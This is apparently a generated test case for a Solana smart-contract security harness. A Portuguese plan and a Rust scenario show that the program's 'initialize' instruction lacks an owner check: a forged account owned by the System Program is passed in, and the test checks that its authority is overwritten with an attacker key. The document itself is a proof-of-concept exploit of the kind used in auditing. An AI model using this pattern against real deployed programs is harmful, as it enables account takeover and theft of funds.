{
  "plan": "O programa `initialize` (native) recebe duas contas: `user_info` (dados mutáveis) e `authority_info`. Ele desserializa `user_info` como `User` (32 bytes de authority) e sobrescreve a authority com a chave de `authority_info`, sem verificar o dono de `user_info`. O baseline usa uma conta `user_info` legítima (dono = program_id) e uma authority qualquer, provando que o cenário está montado. O ataque fornece uma conta `user_info` cujo dono é outro programa (ex.: System Program) com dados forjados no layout de `User`; se o programa aceitar e gravar, a conta forjada terá sua authority alterada, demonstrando a falha de verificação de owner. O efeito mede que a authority da conta forjada foi sobrescrita com a chave do atacante.",
  "scenario": "let program_id = env.program_id;

// Conta legítima do programa (dono = program_id) com dados iniciais de User
let legit_authority = Pubkey::new_unique();
let legit_user_data = anchor_account_data("User", &(legit_authority,));
let legit_user = account(&program_id, &legit_user_data, None);

// Authority usada no baseline
let baseline_authority = Pubkey::new_unique();

let baseline_ix = env.raw_ix(&(), &[
    AccountMeta::new(legit_user.key(), false),
    AccountMeta::new_readonly(baseline_authority, false),
]);

let baseline_accounts = vec![
    (legit_user.key(), legit_user.clone()),
    (baseline_authority, wallet(1_000_000)),
];

let baseline_result = env.baseline("initialize legitimo", &baseline_ix, &baseline_accounts);

// Conta forjada: dono diferente do programa (System Program), com dados no layout de User
let forged_authority = Pubkey::new_unique();
let forged_user_data = anchor_account_data("User", &(forged_authority,));
let forged_user = account(&solana_program::system_program::id(), &forged_user_data, None);

// Authority do atacante
let attacker_authority = Pubkey::new_unique();

let attack_ix = env.raw_ix(&(), &[
    AccountMeta::new(forged_user.key(), false),
    AccountMeta::new_readonly(attacker_authority, false),
]);

let attack_accounts = vec![
    (forged_user.key(), forged_user.clone()),
    (attacker_authority, wallet(1_000_000)),
];

let attack_result = env.attack("initialize com conta forjada de outro dono", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let forged_after = after(&attack_result, &forged_user.key());
    let new_authority = read_pubkey(forged_after.data(), 0);
    env.effect("authority da conta forjada foi sobrescrita com a chave do atacante", new_authority == attacker_authority);
    env.effect("conta forjada manteve dono diferente do programa", forged_after.owner() != &program_id);
}"
}

